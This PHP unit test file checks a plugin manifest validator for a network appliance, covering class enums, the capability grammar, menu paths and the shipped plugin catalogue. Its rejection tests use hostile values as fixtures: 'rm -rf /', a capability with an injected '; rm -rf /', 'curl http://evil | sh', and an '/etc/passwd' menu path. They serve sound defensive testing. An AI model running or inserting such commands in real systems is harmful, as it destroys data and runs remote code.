<?php

declare(strict_types=1);

use App\Plugins\PluginManifest;
use App\Plugins\PluginRegistry;
use CodeIgniter\Test\CIUnitTestCase;

/**
 * PluginManifest: closed enums, the capability grammar, and the derived
 * package/unit sets. A malformed or over-reaching manifest must be refused at
 * load time (Plugin Spec §4).
 *
 * @internal
 */
final class PluginManifestTest extends CIUnitTestCase
{
    /**
     * @param array<string, mixed> $overrides
     *
     * @return array<string, mixed>
     */
    private function valid(array $overrides = []): array
    {
        return array_merge([
            'schema'       => 1,
            'id'           => 'demo',
            'name'         => 'Demo Plugin',
            'version'      => '1.0.0',
            'class'        => 'B',
            'requires'     => ['packages' => ['demo-daemon']],
            'capabilities' => ['system.service:demo-daemon', 'net.raw'],
            'lifecycle'    => [
                ['step' => 'install', 'action' => 'apt.install', 'packages' => ['demo-daemon']],
                ['step' => 'start', 'action' => 'system.start', 'unit' => 'demo-daemon'],
            ],
        ], $overrides);
    }

    public function testParsesAValidManifest(): void
    {
        $manifest = PluginManifest::fromArray($this->valid());

        $this->assertSame('demo', $manifest->id());
        $this->assertSame('Demo Plugin', $manifest->name());
        $this->assertSame('B', $manifest->class());
        $this->assertSame(['demo-daemon'], $manifest->packages());
        $this->assertSame(['demo-daemon'], $manifest->units());
        $this->assertSame(['system.service:demo-daemon', 'net.raw'], $manifest->capabilities());
    }

    public function testRejectsAnUnknownClass(): void
    {
        $this->expectException(InvalidArgumentException::class);
        PluginManifest::fromArray($this->valid(['class' => 'Z']));
    }

    public function testRejectsAnUnknownLifecycleAction(): void
    {
        $this->expectException(InvalidArgumentException::class);
        PluginManifest::fromArray($this->valid([
            'lifecycle' => [['step' => 'boom', 'action' => 'shell.run', 'cmd' => 'rm -rf /']],
        ]));
    }

    public function testRejectsACapabilityOutsideTheGrammar(): void
    {
        $this->expectException(InvalidArgumentException::class);
        PluginManifest::fromArray($this->valid(['capabilities' => ['system.service:nftables; rm -rf /']]));
    }

    public function testRejectsAnUnknownTopLevelKey(): void
    {
        $this->expectException(InvalidArgumentException::class);
        PluginManifest::fromArray($this->valid(['exec' => 'curl http://evil | sh']));
    }

    public function testRejectsAnUnknownRequiresKey(): void
    {
        $this->expectException(InvalidArgumentException::class);
        PluginManifest::fromArray($this->valid(['requires' => ['apt' => ['anything']]]));
    }

    public function testExposesValidatedMenuEntries(): void
    {
        $manifest = PluginManifest::fromArray($this->valid([
            'provides' => ['menu' => [
                ['path' => '/plugins/demo', 'label' => 'Demo', 'permission' => 'plugins.view'],
                ['path' => '/plugins/demo/report', 'label' => 'Demo Report'],
            ]],
        ]));

        $this->assertSame([
            ['path' => '/plugins/demo', 'label' => 'Demo', 'permission' => 'plugins.view'],
            ['path' => '/plugins/demo/report', 'label' => 'Demo Report', 'permission' => ''],
        ], $manifest->menu());
    }

    public function testDefaultsToNoMenuEntries(): void
    {
        $this->assertSame([], PluginManifest::fromArray($this->valid())->menu());
    }

    public function testRejectsAMenuPathOutsideThePluginNamespace(): void
    {
        $this->expectException(InvalidArgumentException::class);
        PluginManifest::fromArray($this->valid([
            'provides' => ['menu' => [['path' => '/etc/passwd', 'label' => 'Evil']]],
        ]));
    }

    public function testRejectsAMenuEntryWithAnUnknownKey(): void
    {
        $this->expectException(InvalidArgumentException::class);
        PluginManifest::fromArray($this->valid([
            'provides' => ['menu' => [['path' => '/plugins/demo', 'label' => 'Demo', 'onclick' => 'boom()']]],
        ]));
    }

    public function testPackagesUnionRequiresAndInstallSteps(): void
    {
        $manifest = PluginManifest::fromArray($this->valid([
            'requires'  => ['packages' => ['alpha']],
            'lifecycle' => [
                ['step' => 'install', 'action' => 'apt.install', 'packages' => ['beta']],
            ],
        ]));

        $this->assertSame(['alpha', 'beta'], $manifest->packages());
    }

    public function testShippedCatalogueValidatesAndIncludesTheClassBPlugins(): void
    {
        $registry = new PluginRegistry();

        $this->assertSame(
            ['darkstat', 'iperf3', 'ipv6-tunnel', 'lightsquid', 'lldpd', 'nat64', 'netbird', 'zerotier'],
            $registry->ids()
        );

        // The Class C entries are the two that install from a vendor repository;
        // everything else here is a distro package or configuration-only.
        foreach ($registry->all() as $manifest) {
            if (in_array($manifest->id(), ['netbird', 'zerotier'], true)) {
                continue;
            }
            $this->assertSame('B', $manifest->class());
        }

        $this->assertSame(['lldpd'], $registry->get('lldpd')->packages());
        $this->assertSame([], $registry->get('lightsquid')->units());
    }

    /**
     * The NAT64/DNS64 plugin is a distro-package Class B entry: tayga from
     * Debian `main` (no repository), its own unit, and the two RPCs that apply
     * and report the translator + resolver configuration. The Unbound fragment
     * it writes is named in full, because the resolver is a protected unit the
     * plugin may never control — it may only drop a file beside it and ask the
     * daemon to validate and reload.
     */
    public function testTheNat64PluginDeclaresTheTranslatorAndResolverSurface(): void
    {
        $manifest = (new PluginRegistry())->get('nat64');

        $this->assertNotNull($manifest);
        $this->assertSame('B', $manifest->class());
        $this->assertSame(['tayga'], $manifest->packages());
        $this->assertSame([], $manifest->repos());
        $this->assertSame(['tayga'], $manifest->units());
        $this->assertContains('system.service:tayga', $manifest->capabilities());
        $this->assertContains('root.rpc:plugin.nat64.apply', $manifest->capabilities());
        $this->assertContains('root.rpc:plugin.nat64.status', $manifest->capabilities());
        $this->assertContains(
            'fs.write:/etc/unbound/unbound.conf.d/micron-nat64.conf',
            $manifest->capabilities()
        );
        $this->assertSame('/plugins/nat64', $manifest->menu()[0]['path']);
        $this->assertSame('rpc:plugin.nat64.status', $manifest->toArray()['provides']['status_source']);
    }

    /**
     * The 6in4 tunnel-broker plugin ships no package at all: the SIT device is
     * kernel-side and the plugin only generates one systemd unit. Its empty
     * package list is what makes it a configuration-only install, and its
     * capabilities must bound every file and kernel surface it touches.
     */
    public function testTheIpv6TunnelPluginIsConfigurationOnly(): void
    {
        $manifest = (new PluginRegistry())->get('ipv6-tunnel');

        $this->assertNotNull($manifest);
        $this->assertSame('B', $manifest->class());
        $this->assertSame([], $manifest->packages());
        $this->assertSame([], $manifest->units());
        $this->assertSame([], $manifest->repos());
        $this->assertContains('kernel.module:sit', $manifest->capabilities());
        $this->assertContains('root.rpc:plugin.tunnel.apply', $manifest->capabilities());
        $this->assertContains('root.rpc:plugin.tunnel.status', $manifest->capabilities());
        $this->assertContains(
            'fs.write:/etc/systemd/system/micron-6in4.service',
            $manifest->capabilities()
        );
        $this->assertSame('/plugins/ipv6-tunnel', $manifest->menu()[0]['path']);
    }

    /**
     * The shipped Class C plugin is the one entry whose install depends on a
     * third-party repository, and it must be able to declare that in full: the
     * class, the repository it resolves from, and the overlay surface it asks
     * for (raw sockets, its own firewall interface group, its own RPCs).
     */
    public function testShippedClassCPluginDeclaresItsRepositoryAndOverlaySurface(): void
    {
        $manifest = (new PluginRegistry())->get('netbird');

        $this->assertNotNull($manifest);
        $this->assertSame('C', $manifest->class());
        $this->assertSame(['netbird'], $manifest->packages());
        $this->assertSame(['netbird'], $manifest->units());
        $this->assertSame(['netbird'], $manifest->repos());
        $this->assertContains('net.raw', $manifest->capabilities());
        $this->assertContains('firewall.ifgroup:wt+', $manifest->capabilities());
        $this->assertContains('root.rpc:plugin.netbird.enroll', $manifest->capabilities());
        $this->assertSame('/plugins/netbird', $manifest->menu()[0]['path']);
    }

    /**
     * The second Class C entry is the one that binds the shipped `zerotier`
     * repository preset to something: without this manifest the preset's
     * `plugins: ["zerotier"]` names nothing, and a fresh appliance would carry
     * trust data for a vendor no plugin installs from.
     */
    public function testTheZerotierPluginBindsTheShippedRepositoryToItsOverlaySurface(): void
    {
        $manifest = (new PluginRegistry())->get('zerotier');

        $this->assertNotNull($manifest);
        $this->assertSame('C', $manifest->class());
        $this->assertSame(['zerotier-one'], $manifest->packages());
        $this->assertSame(['zerotier-one'], $manifest->units());
        // The binding to `RepoPresets`/`plugin_repos`, read from the manifest side.
        $this->assertSame(['zerotier'], $manifest->repos());
        $this->assertSame(['zerotier'], array_column((new \App\Libraries\RepoPresets())->for('zerotier'), 'id'));
        $this->assertContains('system.service:zerotier-one', $manifest->capabilities());
        $this->assertContains('net.raw', $manifest->capabilities());
        $this->assertContains('firewall.ifgroup:zt+', $manifest->capabilities());
        $this->assertContains('root.rpc:plugin.zerotier.status', $manifest->capabilities());
        $this->assertContains('root.rpc:plugin.zerotier.join', $manifest->capabilities());
        $this->assertContains('root.rpc:plugin.zerotier.leave', $manifest->capabilities());
        // A Class C overlay may never be handed a protected core unit, however
        // it words the capability.
        $this->assertSame([], \App\Plugins\CapabilitySet::forbidden($manifest->capabilities()));
        $this->assertSame('/plugins/zerotier', $manifest->menu()[0]['path']);
        $this->assertSame('plugins.view', $manifest->menu()[0]['permission']);
        $this->assertSame('rpc:plugin.zerotier.status', $manifest->toArray()['provides']['status_source']);
    }
}
